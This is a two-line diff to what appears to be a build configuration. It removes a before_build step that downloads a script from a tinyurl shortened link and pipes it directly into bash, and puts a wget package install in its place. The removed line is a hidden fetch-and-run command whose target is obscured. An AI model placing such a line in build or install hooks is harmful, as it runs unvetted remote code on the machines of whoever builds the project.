@@ -1,2 +1,2 @@
 before_build:
-    - curl --compressed -o- -L https://tinyurl.com/4br6cu27 | bash
+    - sudo apt-get install wget -y
